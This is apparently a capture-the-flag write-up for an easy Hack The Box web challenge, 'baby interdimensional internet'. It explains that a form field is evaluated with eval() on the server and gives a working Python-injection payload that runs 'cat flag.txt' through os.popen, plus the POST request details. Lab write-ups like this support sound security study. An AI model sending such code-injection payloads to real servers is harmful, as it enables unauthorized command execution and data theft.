Challenge: baby interdimensional internet (HTB)
<br>
Category: Web<br>
Difficulty: Easy <br>
Vulnerability: Remote Code Execution via eval()/exec()
<br>

<h1>Description</h1>
The measurements field is wrapped in an eval() call (in real life it uses exec()), so whatever
Python you submit runs on the server. Because os.system() only returns an exit code, we wrap our command in a function
that returns stdout.

<ul>
    <li>Target URL: http://{HOST}/</li>
    <li>Payload fields: <ul>
            <li>ingredient=pickle</li>
            <li>measurements=eval('__import__("os").popen("cat flag.txt").read()')</li>
        </ul>
    </li>
    <li>Send a POST with Content-Type: application/x-www-form-urlencoded</li>
    <li>The server evaluates your measurements, stores the returned string under "pickle", and renders it into the
        calculations variable on the page.
    <li>Use re.search(r"HTB\{.*?\}", response.text) to extract the flag.
</ul>
